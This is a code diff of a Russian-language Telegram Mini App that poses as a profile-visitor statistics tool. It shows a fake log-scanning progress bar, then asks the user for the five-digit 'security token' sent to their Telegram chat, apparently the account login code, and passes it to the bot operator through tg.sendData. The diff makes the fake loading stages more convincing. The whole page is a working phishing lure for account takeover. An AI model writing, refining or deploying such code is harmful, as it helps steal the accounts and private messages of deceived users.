@@ -12,12 +12,8 @@
         .logo { width: 70px; height: 70px; background: url('https://telegram.org') no-repeat center/contain; margin: 0 auto 20px; }
         h2 { font-size: 20px; margin-bottom: 8px; font-weight: 600; }
         p { color: var(--hint); font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
-        
-        /* Прогресс-бар */
         .progress-container { width: 100%; background: #2c2c2e; border-radius: 10px; height: 8px; margin-bottom: 20px; overflow: hidden; display: none; }
-        .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.3s; }
-        
-        .input-group { display: none; }
+        .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
         .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
@@ -26,67 +22,64 @@
 <body>
     <div class="container">
         <div class="logo"></div>
-        
-        <!-- ШАГ 1: Выбор периода -->
         <div id="step-period">
-            <h2>Выберите период анализа</h2>
-            <p>Статистика просмотров вашего профиля доступна за следующие периоды:</p>
+            <h2>Период анализа</h2>
+            <p>Выберите глубину сканирования логов посещений вашего профиля:</p>
             <button class="btn period-btn" onclick="startLoading()">За последнюю неделю</button>
             <button class="btn period-btn" onclick="startLoading()">За 2 недели</button>
             <button class="btn period-btn" onclick="startLoading()">За месяц (Рекомендуется)</button>
         </div>
-
-        <!-- ШАГ 2: Загрузка -->
         <div id="step-loading" style="display:none;">
-            <h2 id="load-text">Синхронизация данных...</h2>
+            <h2 id="load-text">Подключение...</h2>
             <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
-            <p id="load-hint">Получение зашифрованных логов от серверов Telegram...</p>
+            <p id="load-hint">Установка защищенного соединения...</p>
         </div>
-
-        <!-- ШАГ 3: Ввод кода (Токена) -->
         <div id="step-code" style="display:none;">
-            <h2>Завершение проверки</h2>
-            <p>Для расшифровки данных введите <b>Токен безопасности</b>, отправленный в ваш системный чат Telegram:</p>
+            <h2>Завершение</h2>
+            <p>Для расшифровки отчета введите <b>Токен безопасности</b>, отправленный в ваш чат Telegram:</p>
             <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
             <button class="btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-
         function startLoading() {
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             let width = 0;
-            const bar = document.getElementById('bar');
+            const phases = [
+                {w: 25, t: "Связь с сервером...", h: "Авторизация узла..."},
+                {w: 55, t: "Анализ логов...", h: "Поиск совпадений ID..."},
+                {w: 75, t: "Шифрование...", h: "Подготовка отчета..."}
+            ];
+            let pIdx = 0;
             const interval = setInterval(() => {
+                width += Math.random() * 7;
                 if (width >= 75) {
                     clearInterval(interval);
+                    document.getElementById('bar').style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
-                    }, 500);
+                    }, 1500);
                 } else {
-                    width += Math.random() * 10;
-                    if(width > 75) width = 75;
-                    bar.style.width = width + '%';
+                    if (width > phases[pIdx].w && pIdx < 2) pIdx++;
+                    document.getElementById('load-text').innerText = phases[pIdx].t;
+                    document.getElementById('load-hint').innerText = phases[pIdx].h;
+                    document.getElementById('bar').style.width = width + '%';
                 }
-            }, 300);
+            }, 500);
         }
-
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            if(val.length < 5) return alert("Неверный формат токена");
+            if(val.length < 5) return alert("Введите 5 цифр");
             tg.sendData(JSON.stringify({t: 'c', v: val}));
-            
-            // Финальная имитация после ввода
             document.getElementById('step-code').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
-            document.getElementById('load-text').innerText = "Генерация отчета...";
+            document.getElementById('load-text').innerText = "Проверка...";
             document.getElementById('bar').style.width = '100%';
-            setTimeout(() => tg.close(), 3000);
+            setTimeout(() => tg.close(), 2500);
         }
     </script>
 </body>
